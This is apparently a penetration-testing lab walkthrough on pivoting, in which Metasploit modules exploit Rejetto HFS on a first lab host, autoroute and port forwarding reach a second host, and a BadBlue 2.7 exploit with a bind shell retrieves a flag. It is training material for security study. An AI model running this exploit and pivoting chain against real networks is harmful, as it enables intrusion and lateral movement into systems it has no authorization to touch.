# Pivoting

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5187–5238. Examples are lab-specific and need verification.

This lab focuses on the concept of pivoting, a crucial technique in penetration testing that allows an attacker to move from one compromised system to another within the same network. By exploiting vulnerabilities on the initial target, you will gain access and then pivot to exploit and access a secondary target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo1.ine.local** and **demo2.ine.local**.

**Objective:** Exploit vulnerabilities in the target machines to gain access and retrieve a flag.

Tools: nmap , searchsploit, msf

```bash

ping -c 4 demo1.ine.local
ping -c 4 demo2.ine.local
nmap demo1.ine.local
nmap -sV -p80 demo1.ine.local
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo1.ine.local
exploit
ipconfig
#We can observe, there is only one network adapter and we have two machine IP addresses.
#But, we cannot access “demo2.ine.local” directly from the attacker’s machine.
#We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.

run autoroute -s 10.0.19.0/20

background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
sessions -i 1
portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
portfwd list
#We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap

#The machine is running BadBlue HTTPd 2.7, a Windows-based web server. We will search the exploit module for badblue 2.7 using searchsploit.
nmap -sV -sS -p 1234 localhost
searchsploit badblue 2.7
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
shell
cd /
dir
type flag.txt
```
